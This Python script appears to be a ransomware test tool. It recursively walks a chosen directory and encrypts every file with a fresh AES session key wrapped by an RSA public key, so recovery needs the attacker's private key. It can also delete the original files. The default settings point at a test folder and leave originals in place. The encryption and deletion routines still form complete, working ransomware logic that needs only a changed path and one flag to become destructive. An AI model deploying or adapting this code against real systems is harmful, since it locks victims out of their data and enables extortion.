import os
from pathlib import Path
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# Editable variables
directory = './Ransomtest' # the directory to encrypt
publickey_file = 'public.pem' # file name of public key
fileExtension = '.encryptednormally' # use any extension, this will be the file extension of encrypted files
excludeExtension = ['.py', '.pem', '.r4ns0m3d', '.decrypted', '.decryptednormally', fileExtension] # file extensions to exclude from encryption
clean_original_files = False # whether the program will delete original unencrypted files after encryption
clean_encrypted_files = True # whether the program will delete pre-existing encrypted files upon startup (useful to clear encrypted files of a previous runtime)

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encrypt(dataFile, publicKey):
    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    
    # create a new outfile
    fileName = dataFile.split(extension)[0]
    encryptedFile = fileName + extension + fileExtension

    with open(dataFile, 'rb') as f:
        data = bytes(f.read())

        # encrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        print(f"\t\tEncrypted text: {ciphertext}")

        # write the chunk to outfile
        with open(encryptedFile, 'ab') as out:
            [ out.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]

    # delete original files when finished?
    if clean_original_files:
        os.remove(dataFile)

# get public key
with open(publickey_file, 'rb') as f:
    pubKey = f.read()
# iterate through items in directory and encrypt each one
for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()
    print(f"Now encrypting {filePath}")
    if fileType in excludeExtension:
        if fileType == fileExtension and clean_encrypted_files:
            os.remove(filePath)
        continue
    encrypt(filePath, pubKey)